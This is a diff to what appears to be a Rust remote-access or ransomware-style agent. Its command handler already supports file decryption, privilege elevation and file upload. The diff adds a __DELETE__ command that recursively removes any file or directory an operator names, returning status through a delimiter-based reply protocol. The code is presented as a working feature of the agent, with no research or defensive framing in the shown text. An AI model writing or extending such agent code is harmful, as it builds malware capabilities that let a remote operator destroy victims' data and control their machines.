@@ -448,6 +448,10 @@ fn process_command(command: &str) -> String {
         let params = command.strip_prefix("__DECRYPT__:").unwrap_or("");
         debug_print!("DEBUG: Decrypting files: {}", params);
         decrypt_files(params)
+    } else if command.starts_with("__DELETE__:") {
+        let path = command.strip_prefix("__DELETE__:").unwrap_or("");
+        debug_print!("DEBUG: Deleting file/folder: {}", path);
+        delete_path(path)
     } else if command == "__ELEVATE__" {
         debug_print!("DEBUG: Re-executing agent with admin privileges...");
         elevate_agent()
@@ -1452,6 +1456,40 @@ fn upload_file(command: &str) -> String {
         Err(e) => {
             debug_print!("DEBUG: Error decodificando base64: {}", e);
             format!("__ERROR__:Error decodificando datos: {}{}", e, DELIMITER)
+        }
+    }
+}
+
+/// Deletes a file or directory at the given path
+/// Uses native Rust fs operations which map to OS-level calls
+fn delete_path(path: &str) -> String {
+    let target = Path::new(path);
+
+    if !target.exists() {
+        return format!("__ERROR__:Path not found: {}{}", path, DELIMITER);
+    }
+
+    if target.is_dir() {
+        match fs::remove_dir_all(target) {
+            Ok(_) => {
+                debug_print!("DEBUG: Directory deleted: {}", path);
+                format!("__DELETED__:{}{}", path, DELIMITER)
+            }
+            Err(e) => {
+                debug_print!("DEBUG: Error deleting directory: {}", e);
+                format!("__ERROR__:Failed to delete directory: {}{}", e, DELIMITER)
+            }
+        }
+    } else {
+        match fs::remove_file(target) {
+            Ok(_) => {
+                debug_print!("DEBUG: File deleted: {}", path);
+                format!("__DELETED__:{}{}", path, DELIMITER)
+            }
+            Err(e) => {
+                debug_print!("DEBUG: Error deleting file: {}", e);
+                format!("__ERROR__:Failed to delete file: {}{}", e, DELIMITER)
+            }
         }
     }
 }
